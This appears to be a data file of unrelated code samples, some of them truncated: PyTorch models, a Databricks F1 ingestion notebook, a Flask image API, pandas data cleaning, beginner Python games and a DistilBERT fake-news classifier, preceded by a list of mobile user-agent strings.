SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "from __future__ import print_function\nimport torch\nimport torch.nn as nn\nimport numpy as np\nimport math\nimport torch.nn.functional as F\n\nfrom options import copy_opt_file\n\nclass TRGNet(nn.Module):\n    def __init__(self, channel_num, dict_num, kernel_num, kernel_size, theta_num, init_a, init_b, writer, unpaired=False, path=None):\n        super(TRGNet, self).__init__()\n        if path is not None:\n            copy_opt_file(__file__, path)\n        self.theta = GetTheta(theta_num)\n        self.tau = GetParams(0.5)\n        self.s_l = GetParams(1)\n        self.s_w = GetParams(1)\n        self.alpha = GetAlpha(dict_num, kernel_num)\n        self.unpaired = unpaired\n        self.writer = writer\n        self.Encoder = Encoder(channel_num, kernel_num, kernel_size, init_a, init_b)\n\n    def forward(self, B, X0, ifshow=0, step=0, logger=None):\n        theta = self.theta(B.size(0))\n        tau = self.tau(B.size(0))\n        s_l = self.s_l(B.size(0))\n        s_w = self.s_w(B.size(0))\n        alpha = self.alpha(B.size(0))\n        X, R, X_temp, R3, Mask, Rkern3 = self.Encoder(B, theta, s_l, s_w, tau, alpha, X0, ifshow, step, self.writer, unpaired=self.unpaired, logger=logger)\n\n        return X, R, X_temp, R3, theta\n\n    def show_factor(self, batchsize):\n        theta = self.theta(batchsize)\n        tau = self.tau(batchsize)\n        s_l = self.s_l(batchsize)\n        s_w = self.s_w(batchsize)\n        alpha = self.alpha(batchsize)\n        return theta, tau, s_l, s_w, alpha\n\n    def test_factor(self, B, theta=None, tau=None, s_l=None, s_w=None, alpha=None, Z=None):\n        if theta == None:\n            theta = self.theta(B.size(0))\n        if tau == None:\n            tau = self.tau(B.size(0))\n        if s_l == None:\n            s_l = self.s_l(B.size(0))\n        if s_w == None:\n            s_w = self.s_w(B.size(0))\n        if alpha ==None:\n            alpha = self.alpha(B.size(0))\n        X0 = 0\n        ifshow = 0\n        step = 0\n        X, R, X_temp, R3, Mask, Rkern3 = self.Encoder(B, theta, s_l, s_w, tau, alpha, X0, ifshow, step, self.writer, unpaired=self.unpaired, Z=Z)\n\n        return X, R, X_temp, R3, theta, Mask, Rkern3\n\n\nclass Encoder(nn.Module):\n    def __init__(self, channel_num, kernel_num, kernel_size, init_a, init_b):\n        super(Encoder, self).__init__()\n        self.up = nn.Parameter(torch.ones([1, channel_num, 1, 1]) / 2, requires_grad=True)\n        self.up2 = nn.Parameter(torch.ones([1, channel_num, 1, 1]), requires_grad=True)\n        self.outadjust = nn.Parameter(torch.FloatTensor([0.1]), requires_grad=True)\n\n        self.getBasis = GetBasis(kernel_size)\n        temp_a = torch.FloatTensor(np.tile(np.expand_dims(init_a, axis=2), [1, 1, 3]))\n        temp_b = torch.FloatTensor(np.tile(np.expand_dims(init_b, axis=2), [1, 1, 3]))\n        weights = torch.cat([temp_a, temp_b], dim=0)  \n        self.coef1 = nn.Parameter(weights, requires_grad=True)\n        self.coef2 = nn.Parameter(weights, requires_grad=True)\n        self.coef3 = nn.Parameter(weights, requires_grad=True)\n        self.kernel_size = kernel_size\n        self.kernel_num = kernel_num\n        self.channel = channel_num\n        self.relu = nn.ReLU()\n        self.MapNet1 = MapNet1(channel_num, kernel_num, 3)\n        self.MapNet2 = MapNet2(channel_num, kernel_num, 3)\n        self.MapNet3 = MapNet3(channel_num, kernel_num, 3)\n        self.MerNet = MerNet(channel_num, 3)\n\n    def forward(self, B, theta, s_l, s_w, tau0, alpha, X0, ifshow, step, writer, unpaired=False, Z=None, logger=None):\n        if Z == None:\n            Z = torch.randn(B.size(0), self.kernel_num, B.size(2), B.size(3)).cuda()\n        tau = tau0.unsqueeze(2).unsqueeze(3)\n        M1 = self.relu(self.MapNet1(Z, theta)-tau)\n        BasisC, BasisS, Mask = self.getBasis(theta, s_w, s_l)\n        Basis = torch.cat([BasisC, BasisS], dim=4)\n        if Basis.shape[1] == self.coef3.shape[1]:\n            Dict1 = torch.einsum('bnijk,knm->bmnij', Basis, self.coef1)\n        else:\n            Dict1 = torch.einsum('bcijk,knm->bmnij', Basis, self.coef1)\n        Rker1 = torch.einsum('bmnij,bnk->bmkij', Dict1, alpha)\n        M1t = M1.reshape(1, M1.size(0) * M1.size(1), M1.size(2), M1.size(3))\n        Rker1t = Rker1.reshape(Rker1.size(0) * Rker1.size(1), Rker1.size(2), Rker1.size(3), Rker1.size(4))\n        R1 = F.conv2d(M1t, Rker1t, padding=self.kernel_size//2, groups=B.size(0))\n        R1 = R1.reshape(B.size(0), B.size(1), B.size(2), B.size(3))\n\n        M2 = self.relu(self.MapNet2(R1, theta)-tau)\n        if Basis.shape[1] == self.coef3.shape[1]:\n            Dict2 = torch.einsum('bnijk,knm->bmnij', Basis, self.coef2)\n        else:\n            Dict2 = torch.einsum('bcijk,knm->bmnij', Basis, self.coef2)\n        Rker2 = torch.einsum('bmnij,bnk->bmkij', Dict2, alpha)\n        M2t = M2.reshape(1, M2.size(0) * M2.size(1), M2.size(2), M2.size(3))\n        Rker2t = Rker2.reshape(Rker2.size(0) * Rker2.size(1), Rker2.size(2), Rker2.size(3), Rker2.size(4))\n        R2 = F.conv2d(M2t, Rker2t, padding=self.kernel_size//2, groups=B.s",
    "# Databricks notebook source\n# MAGIC %md\n# MAGIC ###Ingest drivers.json file\n\n# COMMAND ----------\n\n# MAGIC %run \"../includes/configuration\"\n\n# COMMAND ----------\n\n# MAGIC %md\n# MAGIC ##### Step-1 Read the json file using spark dataframe reader\n\n# COMMAND ----------\n\nfrom pyspark.sql.types import StructType,StructField,IntegerType,StringType,DateType\n\n# COMMAND ----------\n\nname_schema=StructType(fields=[StructField(\"forename\",StringType(),True),\n                       StructField(\"surname\",StringType(),True)])\n\n# COMMAND ----------\n\ndrivers_schema=StructType(fields=[\n    StructField(\"driverId\",IntegerType(),False),\n    StructField(\"driverRef\",StringType(),True),\n    StructField(\"number\",IntegerType(),True),\n    StructField(\"code\",StringType(),True),\n    StructField(\"name\",name_schema),\n    StructField(\"dob\",DateType(),True),\n    StructField(\"nationality\",StringType(),True),\n    StructField(\"url\",StringType(),True)\n])\n\n# COMMAND ----------\n\ndrivers_df=spark.read.schema(drivers_schema).json(f'{raw_folder_path}/drivers.json')\n\n# COMMAND ----------\n\n# MAGIC %md\n# MAGIC #####Step-2 Rename columns and add new columns\n# MAGIC 1. driverId renamed to driver_id\n# MAGIC 2. driverRef renamed to driver_ref\n# MAGIC 3. ingestion date added\n# MAGIC 4. name added with concatenation of forename and surname\n\n# COMMAND ----------\n\nfrom pyspark.sql.functions import current_timestamp,col,lit,concat\n\n# COMMAND ----------\n\ndrivers_with_column_df=drivers_df.withColumnRenamed(\"driverId\",\"driver_id\")\\\n                                 .withColumnRenamed(\"driverRef\",\"driver_ref\")\\\n                                 .withColumn(\"ingestion_date\",current_timestamp())\\\n                                 .withColumn(\"name\",concat(col(\"name.forename\"),lit(\" \"),col(\"name.surname\")))\n\n# COMMAND ----------\n\n# MAGIC %md\n# MAGIC #####Step-3 Drop the unwanted columns\n# MAGIC 1. url\n\n# COMMAND ----------\n\ndrivers_final_df=drivers_with_column_df.drop(col(\"url\"))\n\n# COMMAND ----------\n\n# MAGIC %md\n# MAGIC #####Step-4 Write the output to processed container in parquet format\n\n# COMMAND ----------\n\ndrivers_final_df.write.mode(\"overwrite\").format(\"parquet\").saveAsTable(\"f1_processed.drivers\")",
    "from flask import Flask, request\nfrom flask_caching import Cache\nfrom filesystem import Filesystem\n\nconfig = {\n    \"DEBUG\": True,\n    \"CACHE_TYPE\": \"SimpleCache\",\n    \"CACHE_DEFAULT_TIMEOUT\": 300\n}\n\ncache = Cache(config=config)\n\napp = Flask(__name__)\napp.config.from_mapping(config)\ncache = Cache(app)\n\nfsy = Filesystem()\n\n\n@app.route('/')\n@app.route('/endpoints')\n@cache.cached()\ndef entry_point():\n    return fsy.getEndpoints()\n\n\n@app.route('/<endpoint>')\n@cache.cached()\ndef endpoints(endpoint):\n    return fsy.getEndpointEntities(endpoint)\n\n\n@app.route('/<endpoint>/all')\n@cache.cached()\ndef entities_all(endpoint):\n    availableEntities = fsy.getEndpointEntities(endpoint)\n    entities = []\n    for entity in availableEntities:\n        entities.append(fsy.getEntity(endpoint, entity))\n\n    return entities\n\n\n@app.route('/<endpoint>/<entity>')\n@cache.cached()\ndef entity(endpoint, entity):\n    return fsy.getEntity(endpoint, entity)\n\n\n@app.route('/<endpoint>/<entity>/images')\n@cache.cached()\ndef images(endpoint, entity):\n    return fsy.getImages(endpoint, entity)\n\n\n@app.route('/<endpoint>/<entity>/<image>')\n@app.route('/<endpoint>/<entity>/<image>/<format>')\ndef image(endpoint, entity, image, format='webp'):\n    return fsy.getImage(endpoint, entity, image, format)\n\n\nif __name__ == '__main__':\n    app.run(debug=True, port=8001)\n",
    "# %%\nimport pandas as pd\nimport db_connection \nimport re\n\n# %%\n\n\n# %%\ndf_cust1 = pd.read_json('Market 1 Customers.json')\ndf_delv1 = pd.read_csv('Market 1 Deliveries.csv')\ndf_ord1 = pd.read_csv('Market 1 Orders.csv')\ndf_cust2 = pd.read_json('Market 2 Customers.json')\ndf_delv2 = pd.read_csv('Market 2 Deliveries.csv')\ndf_ord2 = pd.read_csv('Market 2 Orders.csv')\n\n# %%\n\n\n# %%\n# find completely empty columns\nprint(\"Market 1************\")\nempty_delv1_columns = df_delv1.columns[df_delv1.isna().all()].to_list()\nprint(f\"Market 1 Delivery, Empty  Columns: {empty_delv1_columns}\\n\")\n\nempty_cust1_columns = df_cust1.columns[df_cust1.isna().all()].to_list()\nprint(f\"Market 1 Customers, Empty  Columns: {empty_cust1_columns}\\n\")\n\nempty_ord1_columns = df_ord1.columns[df_ord1.isna().all()].to_list()\nprint(f\"Market 1 Orders, Empty  Columns: {empty_ord1_columns}\\n\")\n\nprint(\"Market 2 ******************\\n\")\n\nempty_delv2_columns = df_delv2.columns[df_delv2.isna().all()].to_list()\nprint(f\"Market 2 Delivery, Empty  Columns: {empty_delv2_columns}\\n\")\n\nempty_cust2_columns = df_cust2.columns[df_cust2.isna().all()].to_list()\nprint(f\"Market 2 Customers, Empty  Columns: {empty_cust2_columns}\\n\")\n\nempty_ord2_columns = df_ord2.columns[df_ord2.isna().all()].to_list()\nprint(f\"Market 2 Orders, Empty  Columns: {empty_ord2_columns}\\n\")\n\n\n# %%\n# Delete all columns which have null values for all records\n    # Market 1 Orders\ndf_ord1.dropna(axis=1, how='all', inplace=True)\n\n    # Market 2 deliveries\ndf_delv2.dropna(axis=1, how='all', inplace=True)\n\n    # Market 2 Orders\ndf_ord2.dropna(axis=1, how='all', inplace=True)\n\n# %%\n# rename Column\ndf_cust1.rename(columns={'Number of employees':'Number of Employees'}, inplace=True)\n\n# %%\n\n\n# %%\n# strip off order_id to be same as the order id in orders.csv, market 1\ndf_delv1['Order_ID']=df_delv1['Order_ID'].str.replace('^YR-|0|,', '', regex=True)\ndf_delv1['Order_ID'].str.strip()\n\n# %%\ndf_delv1.columns\n\n# %%\n# convert order id to string in orders.csv\ndf_ord1['Order ID']=df_ord1['Order ID'].astype('string')\n# Rename column Order ID\ndf_ord1.rename(columns={'Order ID':'Order_ID'}, inplace=True)\n\n# %%\n# Inner Join Orders and Deliveries, Market1\ndf_orders_delivery1= df_ord1.merge(df_delv1, how='inner', on='Order_ID')\n\n# %%\ndf_orders_delivery1.sample(10)\n\n# %%\n# Drop null rows were order id and task id is null from new merged data, market 1, orders and delivery\ndf_orders_delivery1.isna().sum()\n# df_orders_delivery1.dropna(subset=['Task_ID', 'Order_ID'], inplace=True)\n\n# %%\ndf_orders_delivery1.columns\n\n# %% [markdown]\n# Final Merge or Join of Data For Market 1\n\n# %%\ndf_cust1.sample(2)\n\n# %%\ndf_customers_orders_market1= df_cust1.merge(df_orders_delivery1, how='inner', on='Customer ID')\n\n# %%\ndf_customers_orders_market1.sample(5)\n# df_customers_orders_market1.columns\n\n# %% [markdown]\n# MARKET 2 TRANSFORMATIONS AND CLEANING\n\n# %%\n\n\n# %%\n# Strip Order ID off unnecessary strings and space, market 2\ndf_delv2['Order_ID']=df_delv2['Order_ID'].str.replace('^YR-|0|,', '', regex=True)\ndf_delv2['Order_ID'].str.strip()\n\n# %%\n\n\n# %%\n# strip delivery order id for market 2\n\ndf_delv2.sample(2)\n\n# %%\n# Cast Order ID to string in markrt 2 orders\ndf_ord2['Order ID']=df_ord2['Order ID'].astype('string')\n# Inner Join Orders and Deliveries, Market2\ndf_orders_delivery2= df_ord2.merge(df_delv2, how='inner', left_on='Order ID', right_on='Order_ID')\n#rename order ID for market 2\ndf_orders_delivery2.rename(columns={'Order ID': 'Order_ID_Mkt2'}, inplace = True)\ndf_orders_delivery2.sample(5)\n\n\n# %%\n# Replace non-numeric values ('-') with NaN\ndf_customers_orders_market1['Cost Price'].replace('-', pd.NA, inplace=True)\ndf_customers_orders_market1['Total Cost Price'].replace('-', pd.NA, inplace=True)\n\n# %%\n# Convert columns to float dtype, coercing errors to NaN\ndf_customers_orders_market1['Cost Price'] = pd.to_numeric(df_customers_orders_market1['Cost Price'], errors='coerce')\ndf_customers_orders_market1['Total Cost Price'] = pd.to_numeric(df_customers_orders_market1['Total Cost Price'], errors='coerce')\n\n\n# %% [markdown]\n# FINAL JOIN, MARKET 2, CUSTOMERS, ORDERS & DELIVERIES\n\n# %%\ndf_customers_orders_market2 = df_cust2.merge(df_orders_delivery2, how='inner', on='Customer ID')\n\n# %%\ndf_customers_orders_market2.sample(5)\n\n# %%\ndf_customers_orders_market1.columns\n\n# %% [markdown]\n# MERGE MARKET 1 AND MARKET 2- OUTER JOIN\n\n# %%\ndf = df_customers_orders_market1.merge(df_customers_orders_market2, how='outer')\n\n# %%\ndf.head(10)\n# df.to_csv('merged_markets.csv', index=False)\n\n# %%\n# df_cust1.dropna(subset=['',''])\ndf.columns\n\n# %%\ndf.rename(columns={'Distance (in km)':'Distance_KM','Distance(m)':'Distance_M','Total_Time_Taken(min)':'Total_Time_Taken_min', 'Sub Total':'Sub Total_Mkt1'  }, inplace=True)\n\n# %%\ndf.isna().sum()\n\n# %%\ndf.drop(columns=['Is Blocked', 'Language', 'Outstanding Amount','Tax','Delivery Charge', 'Tip_x', 'Tip_y', 'Discount_x','Discount_y', 'Remaining Balance', 'Additional Charge', 'Transaction ID', 'Order Preparation Time', 'Debt Amount",
    "from replit import clear\r\nfrom art import logo\r\n\r\nprint(logo)\r\n\r\nbids = {}\r\n\r\n\r\ndef find_highest_bidder(bidding_record):\r\n    # Using max() to find the bidder with the highest bid\r\n    winner = max(bidding_record, key=bidding_record.get)\r\n    highest_bid = bidding_record[winner]\r\n    print(f\"The winner is {winner} with a bid of ${highest_bid}\")\r\n\r\n\r\nwhile True:\r\n    name = input(\"What is your name?: \")\r\n    price = int(input(\"What is your bid?: $\"))\r\n    bids[name] = price\r\n    should_continue = input(\"Are there any other bidders? Type 'yes' or 'no': \").lower()\r\n    if should_continue == \"no\":\r\n        clear()\r\n        find_highest_bidder(bids)\r\n        break\r\n    elif should_continue == \"yes\":\r\n        clear()\r\n\r\n'''\r\nWAY #2\r\n\r\nfrom replit import clear\r\n\r\nfrom art import logo\r\n\r\nprint(logo)\r\n\r\nbids = {}\r\nbidding_finished = False\r\n\r\ndef find_highest_bidder(bidding_record):\r\n  highest_bid = 0\r\n  winner = \"\"\r\n  # bidding_record = {\"Angela\": 123, \"James\": 321}\r\n  for bidder in bidding_record:\r\n    bid_amount = bidding_record[bidder]\r\n    if bid_amount > highest_bid: \r\n      highest_bid = bid_amount\r\n      winner = bidder\r\n  print(f\"The winner is {winner} with a bid of ${highest_bid}\")\r\n\r\nwhile not bidding_finished:\r\n  name = input(\"What is your name?: \")\r\n  price = int(input(\"What is your bid?: $\"))\r\n  bids[name] = price\r\n  should_continue = input(\"Are there any other bidders? Type 'yes or 'no'.\\n\")\r\n  if should_continue == \"no\":\r\n    bidding_finished = True\r\n    find_highest_bidder(bids)\r\n  elif should_continue == \"yes\":\r\n    clear()\r\n\r\n'''\r\n",
    "import pygame\nimport cairosvg\nimport io\nimport random\nimport math\n\nclass DVDLogo:\n    def __init__(self, logo_path, width, height):\n        self.width = width\n        self.height = height\n        self.logo_path = logo_path\n        self.logo_svg_content = self.load_svg_content(logo_path)\n        self.colors = [\n            (255, 0, 0),\n            (0, 255, 0),\n            (0, 0, 255),\n            (255, 255, 0),\n            (255, 165, 0),\n            (255, 20, 147) \n        ]\n        self.logo = self.load_logo(self.logo_svg_content)\n        self.logo_width, self.logo_height = self.logo.get_width(), self.logo.get_height()\n        self.x_positions = width - self.logo_width + 1\n        self.y_positions = height - self.logo_height + 1\n        self.reset()\n        \n    def change_color(self):\n        color = random.choice(self.colors)\n        color_hex = f\"#{color[0]:02x}{color[1]:02x}{color[2]:02x}\"\n        self.logo_svg_content = self.logo_svg_content.replace(self.current_color, color_hex)\n        self.current_color = color_hex\n        self.logo = self.load_logo(self.logo_svg_content)\n\n    def load_svg_content(self, logo_path):\n        with open(logo_path, \"r\") as file:\n            svg_content = file.read()\n        self.current_color = \"#00feff\"\n        return svg_content\n\n    def load_logo(self, svg_content):\n        png_data = cairosvg.svg2png(bytestring=svg_content.encode('utf-8'))\n        return pygame.image.load(io.BytesIO(png_data))\n\n    def reset(self):\n        self.x = random.randint(0, self.width - self.logo_width)\n        self.y = random.randint(0, self.height - self.logo_height)\n        self.dx = random.choice([-2, 2])\n        self.dy = random.choice([-2, 2])\n\n    def update(self):\n        self.x += self.dx\n        self.y += self.dy\n\n        boundary_hit = False\n\n        if self.x <= 0 or self.x + self.logo_width >= self.width:\n            self.dx = -self.dx\n            boundary_hit = True\n        if self.y <= 0 or self.y + self.logo_height >= self.height:\n            self.dy = -self.dy\n            boundary_hit = True\n\n        if boundary_hit:\n            self.change_color()\n\n    def corner_hit(self):\n        hit = (self.x == 0 and self.y == 0) or \\\n              (self.x == 0 and self.y == self.height - self.logo_height) or \\\n              (self.x == self.width - self.logo_width and self.y == 0) or \\\n              (self.x == self.width - self.logo_width and self.y == self.height - self.logo_height)\n        if hit:\n            self.change_color()\n        return hit\n\n    def time_to_next_corner_hit(self):\n        dx = abs(self.dx)\n        dy = abs(self.dy)\n        gcd_value = DVDSimulation.gcd(self.x_positions, self.y_positions)\n        lcm_value = DVDSimulation.lcm(self.x_positions, self.y_positions)\n\n        if self.dx * self.dy > 0:\n            if (self.x - self.y) % gcd_value != 0:\n                return float('inf')\n        else:\n            if (self.x + self.y) % gcd_value != 0:\n                return float('inf')\n\n        return lcm_value / (dx + dy)\n\n    def draw(self, screen):\n        screen.blit(self.logo, (self.x, self.y))\n\nclass DVDSimulation:\n    def __init__(self, width, height, logo_path):\n        pygame.init()\n        self.width = width\n        self.height = height\n        self.screen = pygame.display.set_mode((width, height), pygame.DOUBLEBUF)\n        pygame.display.set_caption(\"DVD Bouncing Logo\")\n        self.clock = pygame.time.Clock()\n        self.fps = 60\n        self.dvd_logo = DVDLogo(logo_path, width, height)\n\n    @staticmethod\n    def gcd(a, b):\n        while b != 0:\n            a, b = b, a % b\n        return a\n\n    @staticmethod\n    def lcm(a, b):\n        return (a * b) // DVDSimulation.gcd(a, b)\n\n    def run(self):\n        running = True\n        frame_count = 0\n        corner_hit = False\n        time_to_corner = self.dvd_logo.time_to_next_corner_hit()\n\n        if math.isinf(time_to_corner):\n            print(\"The DVD logo will never hit a corner.\")\n        else:\n            print(f\"The DVD logo will hit a corner in {time_to_corner:.2f} frames.\")\n\n        while running:\n            for event in pygame.event.get():\n                if event.type == pygame.QUIT:\n                    running = False\n\n            self.screen.fill((0, 0, 0))\n            self.dvd_logo.update()\n            self.dvd_logo.draw(self.screen)\n\n            if self.dvd_logo.corner_hit():\n                corner_hit = True\n\n            time_left = time_to_corner - frame_count\n            if not math.isinf(time_to_corner) and time_left >= 0:\n                seconds_left = round(time_left / self.fps)\n                time_left_text = f\"Time left until corner hit: {round(time_left)} frames - ({seconds_left} seconds)\"\n                font = pygame.font.Font(None, 30)\n                text = font.render(time_left_text, True, (255, 255, 255))\n                self.screen.blit(text, (10, 10))\n\n            pygame.display.flip()\n            self.clock.tick(self.fps)\n            frame_count += 1\n\n            if frame_count ",
    "import re\n\nfrom messages.survey_messages import SECTION_1_QUESTIONS, SECTION_2_QUESTIONS\n\n\ndef check_date(str_date):\n    pattern = re.compile(r'^\\d{2}.\\d{2}.\\d{4}$')\n    if re.match(pattern, str_date):\n        try:\n            day, month, year = map(int, str_date.split('.'))\n            if 1 <= day <= 31 and 1 <= month <= 12 and year >= 1000:\n                return True\n        except:\n            return False\n    return False\n\n\ndef get_answers(section1: list, section2: list):\n    result = \"\u0414\u0430\u043d\u043d\u044b\u0435, \u0432\u0432\u0435\u0434\u0451\u043d\u043d\u044b\u0435 \u0412\u0430\u043c\u0438: \"\n    for i in range(len(SECTION_1_QUESTIONS)):\n        cur_str = f\"{SECTION_1_QUESTIONS[i]}: {section1[i]}\\n\"\n        result += cur_str\n    result += \"\\n\"\n\n    for i in range(len(SECTION_2_QUESTIONS)):\n        cur_str = f\"{SECTION_2_QUESTIONS[i]}: {section2[i]}\\n\"\n        result += cur_str\n\n    '''result += \"\u0414\u0430\u043d\u043d\u044b\u0435, \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0435 \u0438\u0441\u043a\u0443\u0441\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u043c \u0438\u043d\u0442\u0435\u043b\u043b\u0435\u043a\u0442\u043e\u043c:\\n\"\n    result += \"\u042d\u043f\u0438\u0442\u0430\u0444\u0438\u044f:\\n\"\n    result += epitaph + \"\\n\\n\"\n    result += \"\u0411\u0438\u043e\u0433\u0440\u0430\u0444\u0438\u044f:\\n\"\n    result += \"\\n\".join(q for q in biography)'''\n\n    return result\n",
    "# !/usr/bin/env python\n# -*-coding:utf-8 -*-\n# @Time    : 2021/10/08 16:59\n# @Author  : dongZheX\n# @Version : python3.7\n# @Desc    : $END$\nimport torch\nfrom torch.nn import Linear, BatchNorm1d, Sequential, ReLU, ModuleList, LayerNorm\nfrom torch_geometric.nn import MessagePassing\nfrom torch_geometric.utils import add_self_loops, degree\nfrom torch_sparse import SparseTensor, matmul\nfrom torch import Tensor\nimport torch.nn.functional as F\nfrom typing import Callable, Union\nfrom torch_geometric.typing import OptPairTensor, Adj, OptTensor, Size\nfrom torch_geometric.nn import GCNConv, SAGEConv, GATConv, DeepGCNLayer, ChebConv, GINConv, JumpingKnowledge, GatedGraphConv, GENConv\nfrom torch_geometric.utils import to_undirected, add_self_loops\nfrom models.mlp import MLP\nimport random\nimport numpy as np\nfrom models.MPNCOV import Triuvec\n\nclass FOGConv(MessagePassing):\n    def __init__(self, input_channel, hidden_channel1, hidden_channel2, output_channel, bias=False, **kwargs):\n        super().__init__(aggr='add')\n        kwargs.setdefault('aggr', 'add')\n        super(FOGConv, self).__init__(**kwargs)\n        self.input_channel = input_channel\n        self.hidden_channel1 = hidden_channel1\n        self.hidden_channel2 = hidden_channel2\n        self.output_channel = output_channel\n        self.bias = bias\n        self.reduction1 = Linear(self.input_channel, self.hidden_channel1, bias=self.bias)\n        self.norm1 = BatchNorm1d(self.hidden_channel1)\n        self.reduction2 = Linear(self.hidden_channel1, self.hidden_channel2, bias=self.bias)\n        self.norm2 = BatchNorm1d(self.hidden_channel2)\n        self.proj = Linear(self.hidden_channel1*self.hidden_channel2, self.output_channel, bias=self.bias)\n\n    def reset_parameters(self):\n        self.reduction1.reset_parameters()\n        self.norm1.reset_parameters()\n        self.reduction2.reset_parameters()\n        self.norm2.reset_parameters()\n        self.proj.reset_parameters()\n\n    def forward(self, x:Tensor, edge_index:Tensor, edge_attr=None):\n        # Mapping Layer\n        x_des = self.norm1(F.leaky_relu(self.reduction1(x)))\n        x_src = self.norm2(F.leaky_relu(self.reduction2(x_des)))\n        feat = self.propagate(edge_index=edge_index, x=(x_src, x_des))\n\n        return self.proj(feat)\n\n    def message(self, x_j:Tensor, x_i:Tensor, edge_attr:Tensor = None) -> Tensor:\n        # x_j is source, x_i is target\n        E, D1 = x_i.shape\n        E, D2 = x_j.shape\n        # source(x_i) to target(x_j)\n        KP = torch.einsum(\"ab,ac->abc\", x_i, x_j).reshape(E, D1*D2)\n        # How to fuse edge_attr\n        return KP\n\n    def message_and_aggregate(self, adj_t: SparseTensor, x: Tensor) -> Tensor:\n        x_src, x_des = x\n        N = x_src.size(0)\n        x_ = matmul(adj_t, x_src, reduce=self.aggr)\n        return torch.einsum('ik,kj -> kij', x_des.transpose(0, 1), x_).reshape(N, -1)\n\n\nclass _FOGConv(MessagePassing):\n    def __init__(self, input_channel, hidden_channel, output_channel, is_triu=True, **kwargs):\n        super().__init__(aggr='add')\n        kwargs.setdefault('aggr', 'add')\n        super(_FOGConv, self).__init__(**kwargs)\n        self.input_channel = input_channel\n        self.hidden_channel = hidden_channel\n        self.output_channel = output_channel\n        self.is_triu = is_triu\n        self.reduction1 = Linear(self.input_channel, self.hidden_channel, bias=self.bias)\n        self.norm1 = BatchNorm1d(self.hidden_channel1)\n        self.reduction2 = Linear(self.input_channel, self.hidden_channel, bias=self.bias)\n        self.norm2 = BatchNorm1d(self.hidden_channel2)\n        if self.is_triu:\n            self.proj = Linear(int(self.hidden_channel1*(self.hidden_channel2+1)/2), self.output_channel, bias=self.bias)\n        else:\n            self.proj = Linear(self.hidden_channel*self.hidden_channel, self.output_channel, bias=self.bias)\n\n\n    def reset_parameters(self):\n        self.reduction1.reset_parameters()\n        self.norm1.reset_parameters()\n        self.reduction2.reset_parameters()\n        self.norm2.reset_parameters()\n        self.proj.reset_parameters()\n\n    def forward(self, x:Tensor, edge_index:Tensor, edge_attr=None):\n        # Mapping Layer\n        x_des = self.norm1(F.relu(self.reduction1(x)))\n        x_src = self.norm2(F.relu(self.reduction2(x)))\n        feat = self.propagate(edge_index=edge_index, x=(x_src, x_des))\n        return self.proj(feat)\n\n    def message(self, x_j:Tensor, x_i:Tensor, edge_attr:Tensor = None) -> Tensor:\n        # x_j is source, x_i is target\n        E, D1 = x_i.shape\n        E, D2 = x_j.shape\n        # source(x_i) to target(x_j)\n        KP = torch.einsum(\"ab,ac->abc\", x_i, x_j)\n        if self.is_triu:\n            KP = Triuvec.apply(KP).reshape(E, -1)\n        else:\n            KP = KP.reshape(E, -1)\n        # How to fuse edge_attr\n        return KP\n\n    def message_and_aggregate(self, adj_t: SparseTensor, x: Tensor) -> Tensor:\n        x_src, x_des = x\n        N = x_src.size(0)\n        x_ = matmul(adj_t, x_src, reduce=self.agg",
    "import pandas as pd\nfrom textblob import TextBlob\nimport spacy\nimport textstat\nfrom spacy.lang.en.stop_words import STOP_WORDS\nfrom transformers import DistilBertForSequenceClassification, Trainer, TrainingArguments\nfrom transformers import DistilBertTokenizerFast\nfrom datasets import Dataset\nfrom sklearn.metrics import accuracy_score, precision_score, recall_score, confusion_matrix, f1_score\nfrom transformers import EvalPrediction\nimport numpy as np\n\n# Initialize spaCy\nnlp = spacy.load(\"en_core_web_sm\")\n\n# Load dataset\ndf = pd.read_csv('news.csv')\nprint(\"1\")\n\n# Define a mapping from label strings to integers\nlabel_to_int = {\"FAKE\": 0, \"REAL\": 1}\n\n# Apply this mapping to your labels\ndf['label'] = df['label'].map(label_to_int)\nprint(\"1.1\")\n\n\n# Preprocessing function for NER\ndef preprocess_text_for_ner(text):\n    doc = nlp(text)\n    preprocessed_text = ' '.join([token.lemma_.lower() for token in doc if token.text.lower() not in STOP_WORDS and token.is_alpha])\n    return preprocessed_text\n\ndf['preprocessed_text'] = df['text'].apply(preprocess_text_for_ner)\n\n# Additional text analyses\ndf['article_length'] = df['preprocessed_text'].apply(lambda x: len(x.split()))\ndf['sentiment'] = df['preprocessed_text'].apply(lambda x: TextBlob(x).sentiment.polarity)\ndf['readability'] = df['preprocessed_text'].apply(lambda x: textstat.flesch_reading_ease(x))\ndf['entities_count'] = df['preprocessed_text'].apply(lambda x: len(nlp(x).ents))\nprint(\"2\")\n\n\ntokenizer = DistilBertTokenizerFast.from_pretrained('distilbert-base-uncased')\n\ndef tokenize_function(examples):\n    return tokenizer(examples['preprocessed_text'], padding=\"max_length\", 